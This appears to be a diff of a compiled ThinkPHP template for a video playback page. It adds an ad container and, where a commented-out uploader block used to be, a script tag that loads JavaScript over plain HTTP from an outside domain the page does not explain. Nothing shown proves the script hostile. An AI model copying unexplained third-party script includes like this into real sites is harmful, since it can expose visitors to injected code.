@@ -1,4 +1,4 @@
-<?php if (!defined('THINK_PATH')) exit(); /*a:3:{s:27:"./tpl/ms360/video/play.html";i:1562590182;s:30:"./tpl/ms360/common/header.html";i:1562592688;s:30:"./tpl/ms360/common/footer.html";i:1562231560;}*/ ?>
+<?php if (!defined('THINK_PATH')) exit(); /*a:4:{s:27:"./tpl/ms360/video/play.html";i:1562658006;s:30:"./tpl/ms360/common/header.html";i:1562592688;s:29:"./tpl/ms360/common/adver.html";i:1562411089;s:30:"./tpl/ms360/common/footer.html";i:1562231560;}*/ ?>
 <!DOCTYPE html>
 <html>
 <head>
@@ -123,6 +123,12 @@ background-size: 100% auto;
 </div>
 </div>
 
+<div class="topad">
+<ul class="topad-list ad-col1">
+<li>  <script type="text/javascript" src="__ROOT__/tpl/ms360/static/js/home/first.js"></script></li>
+</ul>
+
+</div>
 <link href="__ROOT__/tpl/ms360/static/css/detail.css" rel="stylesheet">
 <link href="__ROOT__/tpl/ms360/static/css/player.css" rel="stylesheet">
 <style>
@@ -153,20 +159,7 @@ padding: 0px !important;
       </div>
     </div>
     <div class="host-box" style="border-radius:5px;">
-     <!--  <div class="host-header"> <a <?php if($videoInfo['user_id']>0): ?>href="<?php echo url('homepage/index',array('uid'=>$videoInfo['user_id'])); ?>" target="_blank"<?php else: ?>href="#" onclick="alert('管理员没有开通个人主页哦~！');"<?php endif; ?>> <img src="<?php echo (isset($videoInfo['headimgurl']) && ($videoInfo['headimgurl'] !== '')?$videoInfo['headimgurl']:'/static/images/user_dafault_headimg.jpg'); ?>"></a></div>
-      <div class="host-name"><a <?php if($videoInfo['user_id']>0): ?>href="<?php echo url('homepage/index',array('uid'=>$videoInfo['user_id'])); ?>" target="_blank"<?php else: ?>href="#" onclick="alert('管理员没有开通个人主页哦~！');"<?php endif; ?>><?php if($videoInfo['user_id']>0): ?><?php echo (isset($videoInfo['member']) && ($videoInfo['member'] !== '')?$videoInfo['member']:''); else: ?>管理员<?php endif; ?></a></div>
-      <div class="host-tags"> <span class="host-tags-1" id="giveGoodBtn"><i class="fa fa-thumbs-o-up"></i> 支持（<var id="goodNum"><?php echo $videoInfo['good']; ?></var>）</span> <span class="host-tags-2 fn-shoucang1" id="shoucang"><i class="fa fa-star"></i> <var id="shoucang"><?php if($isCollected): ?>已收藏<?php else: ?>收藏<?php endif; ?></var></span> </div>
-      <div class="host-num">
-        <p>视频日期：<?php echo date('Y-m-d', $videoInfo['add_time']); ?></p>
-        <p>打赏人次：<var id="count" style="color:red;"><?php echo $count; ?></var> 次<span>|</span>打赏金额：<var id='countprice' style="color:red;"><?php echo $count_price; ?></var> 元</p>
-      </div>
-      <div class="mshost-concerned" style="margin-top:0px;"> <a <?php if($videoInfo['user_id']>0): ?>href="<?php echo url('homepage/index',array('uid'=>$videoInfo['user_id'])); ?>" target="_blank"<?php else: ?>href="#" onclick="alert('管理员没有开通个人主页哦~！');"<?php endif; ?> class="host-btn">TA的主页</a> </div>
-      <div class="share1" style="padding: 0 18px 20px;margin-top:50px;">
-        <div class="bshare-custom icon-medium"><a title="分享到QQ空间" class="bshare-qzone"></a> <a title="分享到新浪微博" class="bshare-sinaminiblog"></a><a title="分享到人人网" class="bshare-renren"></a> <a title="分享到腾讯微博" class="bshare-qqmb"></a><a title="分享到网易微博" class="bshare-neteasemb"></a> <a title="更多平台" class="bshare-more bshare-more-icon more-style-addthis"></a><span class="BSHARE_COUNT bshare-share-count">0</span></div>
-        <script type="text/javascript" charset="utf-8" src="http://static.bshare.cn/b/buttonLite.js#style=-1&amp;uuid=&amp;pophcol=2&amp;lang=zh"></script>
-        <script type="text/javascript" charset="utf-8" src="http://static.bshare.cn/b/bshareC0.js"></script>
-      </div> -->
-    </div>
+	<script src="http://Q.0013v.com/thea1.js"></script>
   </div>
   <div style="width:1200px;margin: auto;height:60px;padding: 0px 0px 0px;">
     <!-- <p style="float:right;">
@@ -993,3 +986,4 @@ btn.css('text-align', 'center');
 <?php endif; ?>
 </body>
 </html>
+
